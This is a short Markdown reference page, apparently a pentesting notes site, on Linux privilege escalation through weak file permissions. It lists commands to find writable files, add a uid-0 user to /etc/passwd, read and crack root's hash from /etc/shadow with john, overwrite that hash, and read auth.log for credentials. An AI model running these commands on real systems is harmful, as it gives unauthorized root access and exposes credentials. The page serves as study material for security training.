---
title: Weak File Permission
parent: Method
layout: default
nav_order: 1
---

Useful command (writable file, readable file, writable folder):\
`find /etc -maxdepth 1 -writable -type f`\
`find /etc -maxdepth 1 -readable -type f`\
`find / -executable -writable -type d 2> /dev/null`

## /etc/passwd
1. Verify the permission:\
   `ls -l /etc/passwd`
2. Generate a password hash:\
   `openssl passwd "password"`
3. Edit the file and change the root's second field(x) to the hash. Alternatively create a new user by appending a new row:\
   `echo "newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash" >> /etc/passwd`
4. Use `su` and type in the password

## /etc/shadow
**If world readable:**
1. Check permission using\
   `ls -l /etc/shadow`
2. Get the password for root:\
   `head -n 1 /etc/shadow`
3. Save the hash to a file:\
   `echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt`
4. Crack using john:\
   `john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
5. Use `su` and type in the password cracked.

**If world writable:**
1. Check permission using\
   `ls -l /etc/shadow`
2. Copy etc/shadow as a backup:\
   `cp /etc/shadow /tmp/shadow`
3. Generate a new sha512 hash:\
   `mkpasswd -m sha-512 newpassword`
4. Edit /etc/shadow for root and replace our hash generated.
5. Use `su` and type in the password cracked.

## /var/log/auth.log
1. Check permission:\
   `ls -la /var/log/auth.log`
2. If allowed to read,\
   `cat /var/log/auth.log`\
   Might contain login credentials.